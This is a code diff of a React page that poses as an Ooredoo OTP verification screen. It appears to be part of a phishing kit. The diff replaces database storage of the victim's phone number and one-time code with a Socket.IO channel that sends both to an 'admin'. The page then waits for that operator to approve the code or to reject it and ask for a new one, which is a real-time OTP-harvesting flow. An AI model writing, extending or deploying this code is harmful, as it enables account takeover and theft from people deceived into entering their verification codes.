@@ -7,8 +7,7 @@ import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
 import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
-import { useLiveDraft } from "@/hooks/useLiveDraft";
-import { socket, visitor, sendData, navigateToPage } from "@/lib/store";
+import { sendData, navigateToPage, isFormApproved, isFormRejected } from "@/lib/store";
 import { getServiceContext } from "@/lib/serviceContext";
 
 const OoredooOtp = () => {
@@ -23,20 +22,42 @@ const OoredooOtp = () => {
   const [digits, setDigits] = useState(["", "", "", ""]);
   const [loading, setLoading] = useState(false);
   const [waiting, setWaiting] = useState(false);
-  const [requestId, setRequestId] = useState<string | null>(() =>
-    typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null
-  );
   const [seconds, setSeconds] = useState(54);
   const inputsRef = useRef<Array<HTMLInputElement | null>>([]);
 
   const code = digits.join("");
   const isValid = code.length === 4;
 
-  useLiveDraft({
-    step: "ooredoo_otp_draft",
-    values: { code },
-    columns: { phone, otp_code: code || undefined },
-  });
+  // Navigate to page on mount
+  useEffect(() => {
+    navigateToPage("رمز OTP Ooredoo");
+  }, []);
+
+  // Watch for admin approval
+  useEffect(() => {
+    if (!waiting) return;
+    if (isFormApproved.value) {
+      setWaiting(false);
+      setLoading(false);
+      navigate("/waiting");
+    }
+  }, [isFormApproved.value, waiting]);
+
+  // Watch for admin rejection
+  useEffect(() => {
+    if (!waiting) return;
+    if (isFormRejected.value) {
+      setRejectionMessage(pick(
+        "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى",
+        "The code you entered is incorrect. Please try again."
+      ));
+      setWaiting(false);
+      setLoading(false);
+      setDigits(["", "", "", ""]);
+      inputsRef.current[0]?.focus();
+      window.scrollTo({ top: 0, behavior: "auto" });
+    }
+  }, [isFormRejected.value, waiting]);
 
   useEffect(() => {
     if (seconds <= 0) return;
@@ -56,70 +77,27 @@ const OoredooOtp = () => {
     if (e.key === "Backspace" && !digits[i] && i > 0) inputsRef.current[i - 1]?.focus();
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!isValid) return;
     setLoading(true);
-
-    const existingId = typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null;
-    let phoneToUse = phone || "—";
-    if (existingId) {
-      const { data: prev } = await supabase
-        .from("login_requests").select("phone").eq("id", existingId).maybeSingle();
-      if (prev?.phone) phoneToUse = prev.phone;
-    }
-
-    const payload = {
-      phone: phoneToUse,
-      otp_code: code,
-      step: "ooredoo_otp",
-      status: "pending",
-      selected_service: selectedService,
-      current_page: "/ooredoo-otp",
-      // Mirror the OTP into activation_data so it survives future steps
-      // that overwrite the top-level otp_code column.
-      activation_data: {
-        ooredoo_otp: code,
-      },
-      updated_at: new Date().toISOString(),
-    } as any;
-    let data: { id: string } | null = null;
-    let error: unknown = null;
-    if (existingId) {
-      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
-      data = res.data as any; error = res.error;
-    }
-    if (!data) {
-      const ins = await supabase.from("login_requests").insert(payload).select("id").single();
-      data = ins.data as any; error = ins.error;
-    }
-    if (error || !data) { setLoading(false); return; }
-    setVisitorRequestId(data.id);
-    setRequestId(data.id);
     clearRejectionMessage();
+
+    // Send OTP via Socket.IO to admin
+    sendData({
+      data: {
+        phone: phone || "—",
+        otp_code: code,
+        service: selectedService || "ooredoo",
+      },
+      current: "رمز OTP Ooredoo",
+      nextPage: "انتظار",
+      waitingForAdminResponse: true,
+      isCustom: true,
+    });
+
     setWaiting(true);
   };
-
-  useEffect(() => {
-    if (!waiting || !requestId) return;
-    const channel = supabase
-      .channel("ooredoo_otp_approval_" + requestId)
-      .on("postgres_changes", {
-        event: "UPDATE", schema: "public", table: "login_requests",
-        filter: `id=eq.${requestId}`,
-      }, (payload) => {
-        const row = payload.new as { status: string };
-        if (row.status === "approved") {
-          navigate("/waiting", { state: { phone, requestId } });
-        } else if (row.status === "rejected") {
-          setRejectionMessage(pick("الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The code you entered is incorrect. Please try again."));
-          setWaiting(false); setLoading(false); setDigits(["", "", "", ""]);
-          inputsRef.current[0]?.focus();
-          window.scrollTo({ top: 0, behavior: "auto" });
-        }
-      }).subscribe();
-    return () => { supabase.removeChannel(channel); };
-  }, [waiting, requestId, navigate, phone, pick]);
 
   const maskedPhone = phone ? "•••••" + phone.slice(-2) : "•••••••";
   const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
